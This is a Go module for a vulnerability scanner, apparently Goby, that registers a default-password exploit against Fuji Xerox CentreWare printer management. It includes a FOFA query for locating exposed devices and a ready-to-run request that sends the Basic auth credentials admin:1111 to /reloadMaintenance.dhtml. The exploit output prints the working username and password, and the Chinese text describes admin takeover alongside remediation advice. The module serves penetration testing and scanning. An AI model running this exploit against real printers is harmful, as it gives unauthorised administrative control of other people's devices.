package exploits

import "git.gobies.org/goby/goscanner/goutils"

func init() {
	expJson := `{
    "Name": "富士施乐CentreWare打印机管理系统默认口令",
    "Description": "富士施乐的CentreWare打印机管理系统为用户提供了功能强大的界面智能地管理打印设备，该系统存在默认口令，攻击者可利用默认口令登录该系统。",
    "Product": "Xerox CentreWare",
    "Homepage": "https://www.office.xerox.com/",
    "DisclosureDate": "2019-08-21",
    "Author": "xiannv",
    "FofaQuery": "body=\"/js/deviceStatus.dhtml\" && body=\"/tabsFrame.dhtml\"",
    "Level": "2",
    "CveID": "",
    "Tags": [
        "默认口令"
    ],
    "VulType": [
        "默认口令"
    ],
    "Impact": "<p>攻击者可通过/reloadMaintenance.dhtml页面利用admin：1111口令登录设备的管理员维护页面，可修改管理员密码和打印机配置，控制打印机，影响用户的正常使用。</p>",
    "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/reloadMaintenance.dhtml",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic YWRtaW46MTExMQ=="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/maintenance/index.dhtml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|define|variable|admin:1111",
                "vulurl|define|variable|{{{scheme}}}://admin:1111@{{{hostinfo}}}/reloadMaintenance.dhtml"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/reloadMaintenance.dhtml",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic YWRtaW46MTExMQ=="
                },
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|\nusername:admin\npasssword:1111"
            ]
        }
    ],
    "Posttime": "2019-12-09 15:11:59",
    "fofacli_version": "3.10.7",
    "fofascan_version": "0.1.16",
    "status": "3",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "8.0",
    "GobyQuery": "body=\"/js/deviceStatus.dhtml\" && body=\"/tabsFrame.dhtml\"",
    "PocId": "10688"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
